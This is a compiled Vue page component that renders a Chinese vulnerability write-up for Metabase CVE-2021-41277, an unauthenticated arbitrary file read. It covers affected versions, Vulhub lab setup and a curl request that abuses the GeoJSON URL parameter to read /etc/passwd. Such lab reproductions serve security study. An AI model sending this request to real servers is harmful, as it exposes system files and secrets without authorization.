import{_ as r}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as n,c as d,a as e,b as a,d as i,e as o}from"./app-58e4a7d6.js";const c={},l=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),h=e("p",null,"Metabase是一个开源的数据分析平台。在其0.40.0到0.40.4版本中，GeoJSON URL验证功能存在远程文件读取漏洞，未授权的攻击者可以利用这个漏洞读取服务器上的任意文件，包括环境变量等。",-1),p=e("p",null,"参考链接：",-1),u={href:"https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr",target:"_blank",rel:"noopener noreferrer"},b={href:"https://github.com/tahtaciburak/CVE-2021-41277",target:"_blank",rel:"noopener noreferrer"},_=o(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>metabase 0.40.0-0.40.4
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个Metabase 0.40.4版本服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，访问<code>http://your-ip:3000</code>可以查看到Metabase的安装引导页面，我们填写初始账号密码，并且跳过后续的数据库填写的步骤即可完成安装：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205171542277.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>执行以下命令读取<code>/etc/passwd</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl -v http://your-ip:3000/api/geojson?url=file:////etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205171545732.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,11);function m(g,f){const t=s("ExternalLinkIcon");return n(),d("div",null,[l,h,p,e("ul",null,[e("li",null,[e("a",u,[a("https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr"),i(t)])]),e("li",null,[e("a",b,[a("https://github.com/tahtaciburak/CVE-2021-41277"),i(t)])])]),_])}const k=r(c,[["render",m],["__file","Metabase任意文件读取漏洞 CVE-2021-41277.html.vue"]]);export{k as default};
